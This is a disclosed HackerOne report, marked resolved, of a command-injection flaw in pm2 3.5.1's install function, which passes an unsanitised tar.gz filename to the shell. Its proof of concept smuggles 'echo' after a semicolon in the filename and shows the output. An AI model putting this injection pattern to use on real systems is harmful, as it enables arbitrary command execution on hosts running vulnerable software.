# [M] Command Injection due to lack of sanitisation of tar.gz filename passed as an argument to pm2.install()  function

## Summary
Severity: Medium (CVSS 6.4)
Program: Node.js third-party modules
Weakness: Command Injection - Generic
Reporter: bl4de
State: resolved
Disclosed: 2019-10-24T09:53:13.071Z
Source: https://hackerone.com/reports/630227

## Details
Hi Guys,

It's been a while :)


I would like to report Command Injection in `pm2.import()` function when `tar.gz` archive is installed with a name provided as user controlled input.
Due to lack of proper validation of `tar.gz` archive filename, this vulnerability allows to inject arbitrary commands and execute them in context of `pm2`.

# Module

**module name:** pm2
**version:** 3.5.1
**npm page:** `https://www.npmjs.com/package/pm2`

## Module Description

PM2 is a production process manager for Node.js applications with a built-in load balancer. It allows you to keep applications alive forever, to reload them without downtime and to facilitate common system admin tasks.

## Module Stats

**~320.000 downloads/week**
**>1.200.000 downloads/month**

# Vulnerability

Packages can be installed using `pm2 install [PACKAGE NAME|PACKAGE URL] [options]` command, both directly from command line and from script using `pm2` API. Arbitrary commands can be injected with either first or second method.

Here's a command which executes `echo 'HERE'` in Bash:

```
bl4de:~/playground/Node $ ./pm2 install "foo.tar.gz;echo 'HERE'"
[PM2][Module] Installing TAR module
[PM2][Module] Installing package foo.tar.gz;echo 'HERE'
tar: Error opening archive: Failed to open 'foo.tar.gz'
HERE -C /var/folders/c8/18ksckq53x3g_086ss5r_x740000gn/T module/package.json
[PM2][ERROR] ENOENT: no such file or directory, open '/var/folders/c8/18ksckq53x3g_086ss5r_x740000gn/T/module/package.json'
┌──────────┬────┬─────────┬──────┬─────┬────────┬─────────┬────────┬─────┬─────┬──────┬──────────┐
│ App name │ id │ version │ mode │ pid │ status │ restart │ uptime │ cpu │ mem │ user │ watching │
```

_Trimmed to 38 lines — full report: https://hackerone.com/reports/630227_
